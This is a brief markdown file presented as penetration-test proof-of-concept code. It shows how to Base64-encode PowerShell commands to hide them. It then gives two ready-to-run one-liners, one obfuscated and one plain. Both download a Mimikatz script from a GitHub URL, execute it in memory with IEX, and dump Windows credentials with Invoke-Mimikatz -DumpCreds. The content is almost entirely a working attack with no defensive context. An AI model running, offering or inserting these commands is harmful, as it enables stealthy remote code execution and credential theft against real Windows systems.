# Pen-test proof of concept code 

## converting to Base64 encoded string
$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 

## running the encoded command with powershell
powershell.exe -encoded $Encoded

## mimikatz powershell encoded.bat win10 compatible
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBoAGEAYwBrAGMAbwAvAHAAbwBjAC8AbQBhAHMAdABlAHIALwBtAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAuAHQAeAB0ACcAKQA7ACAASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzADsA


## mimikatz powershell not encode win10 compatible
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/chackco/poc/master/mimikatz.ps1.txt'); $m = Invoke-Mimikatz -DumpCreds; $m
